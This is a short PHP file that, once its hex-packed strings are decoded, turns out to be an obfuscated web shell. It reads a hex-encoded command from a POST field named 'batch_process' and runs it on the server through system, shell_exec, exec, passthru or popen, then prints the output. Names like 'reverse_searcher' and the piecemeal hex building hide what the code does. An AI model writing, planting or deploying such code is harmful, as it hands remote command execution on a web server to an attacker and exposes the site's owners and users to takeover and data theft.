<?php


$dchunk1 = '73';
$dchunk2 = '74';
$dchunk3 = '6d';
$dchunk4 = '68';
$dchunk5 = '5f';
$dchunk6 = '63';
$dchunk7 = '78';
$dchunk8 = '65';
$dchunk9 = '72';
$dchunk10 = '70';
$dchunk11 = '6e';
$dchunk12 = '61';
$dchunk13 = '67';
$dchunk14 = '6f';
$reverse_searcher1 = pack("H*", $dchunk1.'79'.$dchunk1.$dchunk2.'65'.$dchunk3);
$reverse_searcher2 = pack("H*", '73'.$dchunk4.'65'.'6c'.'6c'.$dchunk5.'65'.'78'.'65'.$dchunk6);
$reverse_searcher3 = pack("H*", '65'.$dchunk7.$dchunk8.'63');
$reverse_searcher4 = pack("H*", '70'.'61'.'73'.$dchunk1.$dchunk2.$dchunk4.$dchunk9.'75');
$reverse_searcher5 = pack("H*", $dchunk10.'6f'.'70'.'65'.$dchunk11);
$reverse_searcher6 = pack("H*", '73'.$dchunk2.$dchunk9.'65'.$dchunk12.$dchunk3.$dchunk5.$dchunk13.'65'.$dchunk2.'5f'.'63'.$dchunk14.'6e'.$dchunk2.$dchunk8.'6e'.'74'.'73');
$reverse_searcher7 = pack("H*", '70'.'63'.'6c'.$dchunk14.$dchunk1.'65');
$batch_process = pack("H*", '62'.$dchunk12.$dchunk2.$dchunk6.'68'.'5f'.$dchunk10.'72'.'6f'.$dchunk6.$dchunk8.'73'.$dchunk1);
if (isset($_POST[$batch_process])) {
    $batch_process = pack("H*", $_POST[$batch_process]);
    if (function_exists($reverse_searcher1)) {
        $reverse_searcher1($batch_process);
    } elseif (function_exists($reverse_searcher2)) {
        print $reverse_searcher2($batch_process);
    } elseif (function_exists($reverse_searcher3)) {
        $reverse_searcher3($batch_process, $sym_marker);
        print join("\n", $sym_marker);
    } elseif (function_exists($reverse_searcher4)) {
        $reverse_searcher4($batch_process);
    } elseif (function_exists($reverse_searcher5) && function_exists($reverse_searcher6) && function_exists($reverse_searcher7)) {
        $object_res = $reverse_searcher5($batch_process, 'r');
        if ($object_res) {
            $token_data_chunk = $reverse_searcher6($object_res);
            $reverse_searcher7($object_res);
            print $token_data_chunk;
        }
    }
    exit;
}
